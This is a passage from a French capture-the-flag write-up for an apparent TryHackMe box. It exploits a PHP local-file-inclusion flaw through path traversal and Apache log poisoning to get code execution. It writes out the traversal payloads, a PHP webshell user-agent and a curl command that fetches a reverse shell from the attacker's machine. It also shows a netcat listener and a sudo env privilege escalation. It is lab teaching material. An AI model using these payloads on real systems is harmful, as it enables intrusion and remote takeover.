&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/?view=dog&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;button&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dog&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;button&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/?view=cat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;button&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;button&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;containsStr&lt;/span&gt;($str, $substr) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($str, $substr) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $ext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;containsStr&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;containsStr&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Here you go!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sorry, only dogs or cats are allowed.&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Et on peut voir quelque chose de tr√®s int√©ressant:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Cette condition est la cause de l‚Äôajout du &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;.php&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; √† la fin du nom du fichier&lt;/p&gt;
&lt;p&gt;En mettent un param√®tre GET &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;ext&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on peut l‚Äôemp√™cher de faire ceci&lt;/p&gt;
&lt;p&gt;On peux donc craft un nouveau payload&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ?view=cat/../../../../../../../../etc/passwd&amp;amp;ext=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;En faisant √ßa, on va lire le /etc/passwd et puisque le param√®tre &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;ext&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; existe, mais qu‚Äôil est vide, le site n‚Äôajoutera pas d‚Äôextention au fichier&lt;/p&gt;
&lt;p&gt;Maintenant qu‚Äôon a un arbitrary file read, il faut le transformer en RCE&lt;/p&gt;
&lt;p&gt;La premi√®re m√©thode qu‚Äôon peut tester est le log poisonning&lt;/p&gt;
&lt;p&gt;Cela consiste √† injecter du code php d‚Äôune mani√®re ou d‚Äôune autre dans les logs du serveur, puis de lire les logs via notre LFI pour que le code qu‚Äôon y a inject√© soit √©xecut√©&lt;/p&gt;
&lt;p&gt;On j√®te un coup d‚Äôoeil rapide √† la requ√™te et on voit que le site utilise apache puisqu‚Äôil y a &lt;strong&gt;Server Apache/2.4.38 (Debian)&lt;/strong&gt; dans les headers&lt;/p&gt;
&lt;p&gt;On va donc lire les logs:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;amp;ext=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948498-5044cd35-79b1-45ed-8cca-304209026729.png&#34; alt=&#34;2022-12-15-184704_928x560_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Et c‚Äôest parfait, on voit que le site log non seulement notre IP, mais aussi notre User-Agent&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948524-44806d26-73a4-4dd7-924d-a272da5909e9.png&#34; alt=&#34;2022-12-15-185117_828x82_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;En mettant &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;du PHP&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans notre &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;User-Agent&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on devrait donc avoir une RCE&lt;/p&gt;
&lt;p&gt;On va tester avec cet &lt;strong&gt;&lt;strong&gt;UA&lt;/strong&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948542-c6c2ded3-072e-41ac-aa29-a699e0a273fd.png&#34; alt=&#34;2022-12-15-185257_885x388_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;eeeet‚Ä¶ j‚Äôai cass√© les logs&lt;/p&gt;
&lt;p&gt;Puisque j‚Äôai fait une erreur dans mon PHP (j‚Äôai oubli√© le ; √† la fin), j‚Äôai cass√© le fichier logs et il est maintenant illisible √† tout jamais ü•≤&lt;/p&gt;
&lt;p&gt;Ma seule option est donc de red√©marrer la box, et de r√©essayer&lt;/p&gt;
&lt;p&gt;Cette fois, je tente avec cet &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;UA&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948594-d712c15b-32ff-488e-80ad-03ce6875d294.png&#34; alt=&#34;2022-12-15-185855_952x513_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ca fonctionne, on peut voir qu‚Äôil a bien √©x√©cut√© le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apr√®s avoir test√© beaucoup de chose et avoir bien gal√©r√©, je passe sur un syst√®me un peu plus ‚Äú&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;webshell&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;‚Äù, je modifie mon &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;user-agent&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; en:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Je peux donc √©xecuter du php avec un param√®tre de ma requ√™te maintenant&lt;/p&gt;
&lt;p&gt;Aucun des reverse shell exec que j‚Äôai essay√© n‚Äôa fonctionn√©, je vais donc get un fichier php depuis ma machine, puis le lire&lt;/p&gt;
&lt;p&gt;Je cr√©e un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;reverse.php&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; sur ma machine, et je lance un serveur python dans le m√™me dossier&lt;/p&gt;
&lt;p&gt;Notre payload ressemble donc √†&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;amp;ext=&amp;amp;cmd=curl 10.xx.xx.xx/reverse.php -o reverse.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948634-8f3eece0-f064-46c7-aa4b-20ee39ef627a.png&#34; alt=&#34;2022-12-15-192041_768x670_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Je re√ßois plein de requ√™tes mais c‚Äôest normal puisqu‚Äôen faisant √ßa on cr√©e aussi une boucle infinie&lt;/p&gt;
&lt;p&gt;Ce n‚Äôest pas un probl√®me puisque le site va quand m√™me get notre reverse shell, on n‚Äôa plus qu‚Äô√† lancer un netcat, et se rendre sur &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/reverse.php&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nc -lvnp 9001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948655-12505c8c-8497-4db2-bd8e-247785b28fa5.png&#34; alt=&#34;2022-12-15-192700_984x239_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On se balade un peu pour trouver les flags, a priori il y en a deux&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948686-1515ba08-c982-45b9-8486-7d07670293f7.png&#34; alt=&#34;2022-12-15-192813_501x581_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;(j‚Äôai trouv√© le 2√®me avant le premier mais pas grave)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;THM{LF1_[...]_aec3fb}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;THM{Th1s_1s_[...]_ab67edfa}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc-inside-docker&#34;&gt;Privesc (inside docker)&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Matching&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Defaults&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;entries&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3732&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cff32a70&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;env_reset&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;mail_badpass&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;secure_path&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sbin\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bin\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sbin\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bin\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sbin\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;may&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;following&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;commands&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3732&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cff32a70&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#a6e22e&#34;&gt;root&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;NOPASSWD&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On a la perm &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; sur &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/usr/bin/env&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/#sudo&#34;&gt;GTFObins&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è sudo env /bin/sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On cat le 3e flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948716-22e25421-2d17-49b4-b74a-4cdce14c9028.png&#34; alt=&#34;2022-12-15-193011_1073x443_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;THM{D1ff3r3nt_[...]_874112}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;sauf qu‚Äôil y en a 4‚Ä¶ ü•≤&lt;/p&gt;
&lt;h1 id=&#34;docker-escape&#34;&gt;Docker escape&lt;/h1&gt;
&lt;p&gt;En regardant attentivement le r√©sultat du &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on voit ceci:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;User www-data may run the following commands on 3732cff32a70&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Le nom de l‚Äôhost indique qu‚Äôon est dans un docker&lt;/p&gt;
